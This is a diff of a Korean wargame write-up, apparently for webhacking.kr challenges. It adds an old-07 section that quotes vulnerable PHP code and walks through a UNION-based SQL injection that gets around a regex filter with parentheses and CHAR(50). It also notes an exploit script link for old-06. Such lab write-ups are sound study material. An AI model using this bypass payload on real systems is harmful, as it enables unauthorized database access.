@@ -141,7 +141,7 @@ admin으로 로그인해야 하는데 이는 이미 있는 id라고 나온다. m
 소스코드를 요약하면,20번 base64 인코딩하고 규칙대로 replace한 값인 user 쿠키와 password 쿠키의 값을 거꾸로 replace하고 20번 base64 디코딩한 값이 각각 admin, nimda와 같으면 풀린다.   
 쿠키에 들어갈 값을 만들어보자.  
 
-__exploit__: [old-06](./code/old-06.py)
+__exploit__: [old-06.py](./code/old-06.py)
 
 변환한 값을 쿠키에 넣어주면 성공.  
 ![pwned](./pwned/old-06.PNG)
@@ -149,3 +149,40 @@ __exploit__: [old-06](./code/old-06.py)
 <br>
 
 ## old-07
+
+### SQL 인젝션
+
+```php
+<?php
+$go=$_GET['val'];
+...
+$db = dbconnect();
+$rand=rand(1,5);
+if($rand==1){
+  $result=mysqli_query($db,"select lv from chall7 where lv=($go)") or die("nice try!");
+}
+...
+$data=mysqli_fetch_array($result);
+if(!$data[0]) { echo("query error"); exit(); }
+if($data[0]==1){
+  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Access_Denied!')\"><p>");
+}
+elseif($data[0]==2){
+  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Hello admin')\"><p>");
+  solve(7);
+}
+?>
+```
+
+소스코드를 확인해보면 GET방식으로 받은 값을 정규표현식을 통해 필터링을 거쳐 5분의 1확률로 성공하는 SQL 쿼리문에 넣는 것 같다.  
+마지막 부분을 보면 $data[0]을 2로 만들어야 문제가 해결되므로 UNION을 이용해 앞의 쿼리문을 거짓으로 만들고 뒤의 쿼리문을 참으로 만들어야 한다.  
+
+따라서 `val=0)UNION SELECT 2` 와 같이 쓰고 싶은데.. 다음 정규표현식이 이를 필터링해 두가지 문제점이 있다.  
+`if(preg_match("/2|-|\+|from|_|=|\\s|\*|\//i",$go)) exit("Access Denied!");`
+
+1. 띄어쓰기가 안된다. 정규표현식이 공백(\s)을 막고 있으므로 괄호를 사용해야 할듯하다.
+2. 2를 사용하지 못한다. 정규표현식이 사칙연산과 2를 막고 있으므로 2를 직접적으로 입력하지 못한다. 따라서 char(50)등의 방법으로 우회해봐야 할듯하다.
+   
+결국 `val=0)UNION(SELECT(CHAR(50))` 과 같이 작성해서 5번정도 새로고침했더니 성공.
+
+![pwned](./pwned/old-07.PNG)
